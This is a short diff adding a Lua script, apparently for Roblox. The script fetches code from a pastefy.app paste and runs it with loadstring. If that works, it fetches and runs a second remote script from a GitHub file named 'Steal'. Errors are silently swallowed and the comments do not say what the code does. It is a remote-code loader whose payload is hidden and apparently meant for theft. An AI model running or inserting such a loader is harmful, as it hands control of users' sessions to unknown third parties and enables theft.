@@ -1,0 +1,11 @@
+-- Wait for script enable 
+local success1, _ = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/CgQypxjZ/raw", true))()
+end)
+
+-- Script successfully!
+if success1 then
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobRbl/Test/refs/heads/main/Steal"))()
+    end)
+end
